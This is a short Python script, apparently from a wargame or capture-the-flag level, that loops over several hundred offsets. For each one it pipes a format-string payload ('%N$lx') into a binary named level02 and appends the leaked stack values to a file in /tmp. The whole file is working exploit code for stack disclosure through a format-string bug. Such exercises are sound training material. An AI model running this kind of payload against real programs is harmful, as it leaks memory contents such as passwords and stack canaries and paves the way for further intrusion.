import os

for i in range(1, 400):
    # For example, the command for the first step is:
    # $> python -c 'print "%1$lx\n"' | ~/level02 | grep "does not have access!" >> /tmp/level02_dump
    # It is saved inside /tmp/level02_dump.
    # It allows us to dump the stack.
    arg1 = "python -c \'print \"%" + str(i) + "$lx" + "\\n\"\'"
    cmd = arg1 + " | ~/level02 | grep \"does not have access!\" >> /tmp/level02_dump"
    os.system("echo -n \"=== " + str(i) + " : \" >> /tmp/level02_dump")
    os.system(cmd)
